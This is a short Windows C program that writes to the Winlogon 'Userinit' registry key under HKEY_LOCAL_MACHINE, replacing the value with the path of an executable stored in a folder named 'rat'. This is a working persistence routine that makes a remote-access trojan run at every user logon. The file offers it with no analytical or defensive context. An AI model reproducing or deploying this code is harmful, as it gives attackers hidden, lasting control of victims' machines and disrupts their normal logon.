#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  const char* ui = "C:\\Users\\snowwolf\\Desktop\\rat\\pre\\wolf.exe";

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"Userinit", 0, REG_SZ, (unsigned char*)ui, strlen(ui));
    RegCloseKey(hkey);
  }

  return 0;
}
